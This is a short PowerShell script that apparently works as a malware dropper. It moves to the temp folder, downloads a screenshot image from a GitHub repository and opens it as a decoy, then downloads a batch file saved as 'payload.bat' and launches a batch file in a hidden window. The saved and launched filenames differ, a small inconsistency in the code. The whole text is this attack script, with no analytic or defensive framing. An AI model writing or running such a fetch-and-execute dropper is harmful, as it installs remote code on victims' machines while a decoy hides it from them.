cd $env:TEMP

Invoke-WebRequest 'https://github.com/Andre0194/service/blob/master/Screenshot_09293832388382.jpg' -OutFile 'Screenshot.jpg'

Start-Process -FilePath 'Screenshot.jpg'

Invoke-WebRequest 'https://github.com/Andre0194/service/raw/refs/heads/master/Screenshot.bat' -OutFile 'payload.bat'
Start-Process -FilePath 'Screenshot.bat' -WindowStyle Hidden
